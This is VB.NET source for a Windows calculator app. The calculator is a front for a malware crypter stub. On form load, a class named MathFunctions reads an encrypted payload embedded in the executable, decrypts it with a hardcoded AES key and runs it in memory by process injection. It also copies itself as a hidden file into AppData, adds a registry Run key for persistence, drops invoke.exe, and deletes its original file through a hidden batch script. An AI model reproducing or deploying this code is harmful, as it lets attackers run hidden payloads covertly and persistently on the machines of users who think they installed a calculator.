        Me.Controls.Add(Me.btnCLR_Curr)
        Me.Controls.Add(Me.btn_Operator_Add)
        Me.Controls.Add(Me.btn_Operator_Subt)
        Me.Controls.Add(Me.btnPow)
        Me.Controls.Add(Me.btn_Operator_div)
        Me.Controls.Add(Me.btn_Operator_Multi)
        Me.Controls.Add(Me.btnCalculate)
        Me.Controls.Add(Me.btnNumPeriod)
        Me.Controls.Add(Me.btn_Num_0)
        Me.Controls.Add(Me.btn_Num_9)
        Me.Controls.Add(Me.btn_Num_8)
        Me.Controls.Add(Me.btn_Num_7)
        Me.Controls.Add(Me.btn_Num_6)
        Me.Controls.Add(Me.btn_Num_5)
        Me.Controls.Add(Me.btn_Num_4)
        Me.Controls.Add(Me.btn_Num_3)
        Me.Controls.Add(Me.btn_Num_2)
        Me.Controls.Add(Me.btn_Num_1)
        Me.Controls.Add(Me.TextBox1)
        Me.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ForeColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(192, Byte), Integer))
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.Name = "Form1"
        Me.Text = "RSM Calculator "
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

#End Region
    'variables to hold operands
    Private Var1 As Double
    Private var2 As Double

    'Varible to hold temporary values
    Private Temp As Double

    'variable for Memory storage
    Private Memory As Double

    'True if "." is use else false
    Private period As Boolean

    'variable to hold Operater
    Private [Operator] As String

    Private Status As Boolean

    Private Sub btn_Num_7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_7.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(7)
        Else
            TextBox1.Text = 7
            Status = False
        End If
    End Sub

    Private Sub btn_Num_8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_8.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(8)
        Else
            TextBox1.Text = 8
            Status = False
        End If
    End Sub

    Private Sub btn_Num_9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_9.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(9)
        Else
            TextBox1.Text = 9
            Status = False
        End If
    End Sub

    Private Sub btn_Num_6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_6.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(6)
        Else
            TextBox1.Text = 6
            Status = False
        End If
    End Sub

    Private Sub btn_Num_5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_5.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(5)
        Else
            TextBox1.Text = 5
            Status = False
        End If
    End Sub

    Private Sub btn_Num_4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_4.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(4)
        Else
            TextBox1.Text = 4
            Status = False
        End If
    End Sub

    Private Sub btn_Num_1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_1.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(1)
        Else
            TextBox1.Text = 1
            Status = False
        End If
    End Sub

    Private Sub btn_Num_2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_2.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(2)
        Else
            TextBox1.Text = 2
            Status = False
        End If
    End Sub

    Private Sub btn_Num_3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_3.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(3)
        Else
            TextBox1.Text = 3
            Status = False
        End If
    End Sub

    Private Sub btn_Num_0_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_0.Click
        If Status = False Then
            If TextBox1.Text.Length > 0 Then
                TextBox1.Text = TextBox1.Text + CStr(0)
            End If
        End If
    End Sub

    Private Sub btnNumPeriod_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnNumPeriod.Click
        If Status = False Then
            If period = False Then
                If TextBox1.Text.Length > 0 Then
                    TextBox1.Text = TextBox1.Text + "."
                Else
                    TextBox1.Text = "0."
                End If
                period = True
            End If
        End If
    End Sub

    Private Sub btnnumSign_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnnumSign.Click
        If Status = False Then
            If TextBox1.Text.Length > 0 Then
                Var1 = -1 * CDbl(TextBox1.Text)
                TextBox1.Text = CStr(Var1)
            End If
        End If
    End Sub

    Private Sub btn_Operator_Add_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Operator_Add.Click
        If TextBox1.Text.Length <> 0 Then
            If [Operator] = "" Then
                Var1 = CDbl(TextBox1.Text)
                TextBox1.Text = ""
            Else
                Calculate()
            End If
            [Operator] = "Add"
            period = False
        End If
    End Sub

    Private Sub btnCalculate_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCalculate.Click
        If TextBox1.Text.Length <> 0 AndAlso Var1 <> 0 Then
            Calculate()
            [Operator] = ""
            period = False
        End If
    End Sub

    Private Sub btn_Operator_Subt_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Operator_Subt.Click
        If TextBox1.Text.Length <> 0 Then
            If [Operator] = "" Then
                Var1 = CDbl(TextBox1.Text)
                TextBox1.Text = ""
            Else
                Calculate()
            End If
            [Operator] = "Sub"
            period = False
        End If
    End Sub

    Private Sub btn_Operator_Multi_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Operator_Multi.Click
        If TextBox1.Text.Length <> 0 Then
            If [Operator] = "" Then
                Var1 = CDbl(TextBox1.Text)
                TextBox1.Text = ""
            Else
                Calculate()
            End If
            [Operator] = "Mult"
            period = False
        End If
    End Sub

    Private Sub btn_Operator_div_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Operator_div.Click
        If TextBox1.Text.Length <> 0 Then
            If [Operator] = "" Then
                Var1 = CDbl(TextBox1.Text)
                TextBox1.Text = ""
            Else
                Calculate()
            End If
            [Operator] = "Div"
            period = False
        End If
    End Sub

    Private Sub btnSqrt_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSqrt.Click
        If TextBox1.Text.Length <> 0 Then
            Temp = CDbl(TextBox1.Text)
            Temp = System.Math.Sqrt(Temp)
            TextBox1.Text = CStr(Temp)
            period = False
        End If
    End Sub

    Private Sub btnPow_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnPow.Click
        If TextBox1.Text.Length <> 0 Then
            If [Operator] = "" Then
                Var1 = CDbl(TextBox1.Text)
                TextBox1.Text = ""
            Else
                Calculate()
            End If
            [Operator] = "Pow"
            period = False
        End If
    End Sub

    Private Sub btnInverse_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnInverse.Click
        If TextBox1.Text.Length <> 0 Then
            Temp = CDbl(TextBox1.Text)
            Temp = 1 / Temp
            TextBox1.Text = CStr(Temp)
            period = False
        End If
    End Sub

    Private Sub btnMemoryPlus_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnMemoryPlus.Click
        If TextBox1.Text.Length > 0 Then
            Memory = Memory + CDbl(TextBox1.Text)
            btnMemStatus.Text = "M"
        End If
    End Sub

    Private Sub btnMemoryMinus_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnMemoryMinus.Click
        If TextBox1.Text.Length > 0 Then
            Memory = Memory - CDbl(TextBox1.Text)
            btnMemStatus.Text = "M"
        End If
    End Sub

    Private Sub btnMemoryRecall_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnMemoryRecall.Click
        If btnMemStatus.Text = "M" Then
            TextBox1.Text = CStr(Memory)
            Status = True
        End If
    End Sub

    Private Sub btnCLR_Curr_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCLR_Curr.Click
        TextBox1.Text = ""
        period = False
    End Sub

    Private Sub btnCLR_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCLR.Click
        TextBox1.Text = ""
        Var1 = 0
        var2 = 0
        [Operator] = ""
        period = False
    End Sub

    Private Sub btnBackspace_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnBackspace.Click
        Dim ch As Char
        Dim i As Int16
        If TextBox1.Text.Length > 0 Then
            ch = TextBox1.Text.Chars(TextBox1.Text.Length - 1)
            If ch = "." Then
                period = False
            End If

            i = TextBox1.Text.Length

            TextBox1.Text = TextBox1.Text.Remove(i - 1, 1)
        End If
    End Sub

    Public Sub Calculate()
        var2 = CDbl(TextBox1.Text)
        If [Operator] = "Add" Then
            Var1 = Var1 + var2
        ElseIf [Operator] = "Sub" Then
            Var1 = Var1 - var2
        ElseIf [Operator] = "Mult" Then
            Var1 = Var1 * var2
        ElseIf [Operator] = "Div" Then
            Var1 = Var1 / var2
        ElseIf [Operator] = "Sqrt" Then
            Exit Sub
        ElseIf [Operator] = "Pow" Then
            Var1 = System.Math.Pow(Var1, var2)
        ElseIf [Operator] = "Inve" Then
            Exit Sub
        End If
        TextBox1.Text = CStr(Var1)
        Status = True
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        MathFunctions.EnsureInitialized()
        MathFunctions.Test()
    End Sub
End Class


Class MathFunctions
    Shared Function RedimPload(ByVal Payload() As Byte, Start As Integer) As Byte()
        Dim NewByts(0 To (Payload.Length - Start) - 1) As Byte
        Return NewByts
    End Function

    Shared Sub AZ(ByVal AppPAth As String, ByVal ExePAth As String)
        Dim L = New anti.IntegrityCheck
        L.AppExePath = ExePAth
        L.AppPath = AppPAth
        L.RunCheck()
    End Sub

    Shared Sub Test()
        Dim AppPath As String = Application.ExecutablePath

        Dim Payload() As Byte = GetPload(AppPath)
        Dim i As Integer = FindSplit(Payload)
        Dim Start As Integer = i
        If Payload(Start - 10) = &H54 Then
            'AZi's
            AZ(Application.StartupPath, Application.ExecutablePath)
        End If

        If Payload(Start - 14) = &H54 Then
            'copy self
            Dim TmpPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
            If AppPath.ToLower.Contains(TmpPath.ToLower) Then
            Else
                Dim AppName As String = Strings.Right(AppPath, (AppPath.ToString.Length - AppPath.LastIndexOf("\")))

                'copy our self to temp and re execute
                Try
                    FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)

                Catch ex As Exception
                    Try
                        FileIO.FileSystem.DeleteFile(TmpPath & AppName)
                        FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)

                    Catch exx As Exception
                        End
                    End Try
                End Try


                System.IO.File.SetAttributes(TmpPath & AppName, IO.FileAttributes.Hidden)
                System.IO.File.SetAttributes(TmpPath & AppName, IO.FileAttributes.System)
                Process.Start(TmpPath & AppName)
                'melt
                If Payload(Start - 12) = &H54 Then
                    FileIO.FileSystem.WriteAllText("a.bat", "ping 127.0.0.1 -n 3 > nul" & Environment.NewLine & "del " & """" & Application.ExecutablePath & """" & Environment.NewLine & "del a.bat", False)
                    Dim startInfo As New ProcessStartInfo("a.bat")
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden
                    Process.Start(startInfo)
                    End
                Else
                    End
                End If

            End If
        End If

        'check if auto startup
        If Payload(Start - 8) = &H54 Then
            startup()
        End If

        If Payload(Start - 16) = &H54 Then
            'net
        Else
            'native
            'drop invoke.exe
            Try
                FileIO.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\invoke.exe", My.Resources.invoke, False)
            Catch ex As Exception
                If FileIO.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\invoke.exe") Then
                Else
                    End
                End If
            End Try
            AppPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\invoke.exe"
        End If
        Dim NewByts() As Byte = RedimPload(Payload, Start)
        NewByts = Loop1(NewByts, Payload, Start)
        NewByts = Loop2(NewByts)



        If Payload(Start - 16) = &H54 Then
            RunPe2.Class1.Run(AES_Decrypt(Decompress(NewByts)), Command, AppPath)
        Else
            CMemoryExecute.Run(AES_Decrypt(Decompress(NewByts)), AppPath, Command)
        End If
        Process.GetCurrentProcess.Kill()
    End Sub


    Public Shared Function Decompress(bytes As Byte()) As Byte()
        Dim stream = New IO.MemoryStream()
        Dim zipStream = New IO.Compression.DeflateStream(New IO.MemoryStream(bytes), IO.Compression.CompressionMode.Decompress, True)
        Dim buffer = New Byte(4095) {}
        While True
            Dim size = zipStream.Read(buffer, 0, buffer.Length)
            If size > 0 Then
                stream.Write(buffer, 0, size)
            Else
                Exit While
            End If
        End While
        zipStream.Close()
        Return stream.ToArray()
    End Function
    Shared Function Loop2(ByVal NewByts() As Byte) As Byte()
        Dim Tmp() As Byte = NewByts
        Dim I As Integer = FindSplit(NewByts) - 7
        ReDim NewByts(0 To I)
        For I = 0 To NewByts.Length - 1
            NewByts(I) = Tmp(I)
        Next
        Return NewByts
    End Function

    Shared Function Loop1(ByVal NewByts() As Byte, ByVal Payload() As Byte, ByVal Start As Integer) As Byte()
        For i As Integer = 0 To NewByts.Length - 1
            NewByts(i) = Payload(Start + i)
        Next
        Return NewByts
    End Function

    Shared Sub startup()
        Dim regKey As Microsoft.Win32.RegistryKey
        regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        regKey.SetValue(Application.ProductName, """" & Application.ExecutablePath & """")
        regKey.Close()
    End Sub
    Shared Function FindSplit(ByVal Payload() As Byte) As Integer
        Dim Found1 As Boolean = False
        Dim Found2 As Boolean = False
        Dim Found3 As Boolean = False
        Dim Found4 As Boolean = False
        Dim Found5 As Boolean = False
        Dim I As Integer = 0
        For Each bytez As Byte In Payload
            If Found5 = True Then Exit For
            If Found1 = False Then
                If bytez = &H21 Then
                    Found1 = True
                End If
            Else
                If Found2 = False Then
                    If bytez = &H0 Then
                        Found2 = True
                    Else
                        Found1 = False
                    End If
                Else
                    If Found3 = False Then
                        If bytez = &H40 Then
                            Found3 = True
                        Else
                            Found1 = False
                            Found2 = False
                        End If
                    Else
                        If Found4 = False Then
                            If bytez = &H0 Then
                                Found4 = True
                            Else
                                Found3 = False
                                Found2 = False
                                Found1 = False
                            End If
                        Else
                            If Found5 = False Then
                                If bytez = &H21 Then
                                    Found5 = True
                                Else
                                    Found4 = False
                                    Found3 = False
                                    Found2 = False
                                    Found1 = False
                                End If
                            End If
                        End If
                    End If
                End If
            End If
            I += 1
        Next
        Return I + 1
    End Function

    Shared Function GetPload(ByVal AppPath As String) As Byte()
        Return FileIO.FileSystem.ReadAllBytes(AppPath)
    End Function
    Public Shared _initialized As Boolean
    Shared Sub EnsureInitialized()
        If Not _initialized Then
            AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf RetrieveEmbeddedAssembly
            _initialized = True
        End If
    End Sub
    Private Shared Function AES_Decrypt(ByVal input() As Byte) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider

        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim decrypted() As Byte = DESDecrypter.TransformFinalBlock(input, 0, input.Length)
            Return decrypted
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
    Private Shared Function RetrieveEmbeddedAssembly(sender As Object, args As System.ResolveEventArgs) As System.Reflection.Assembly
        Dim resourceName As String = "Calculator." + New Reflection.AssemblyName(args.Name).Name + ".dll"
        'resourceName = "dll.dll"
        Using stream = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(resourceName)

            Dim assemblyData = New Byte(stream.Length - 1) {}
            'decode assembly here

            stream.Read(assemblyData, 0, assemblyData.Length)
            assemblyData = AES_Decrypt(Decompress(assemblyData))
            Return Reflection.Assembly.Load(assemblyData)

        End Using ' stream
    End Function

End Class
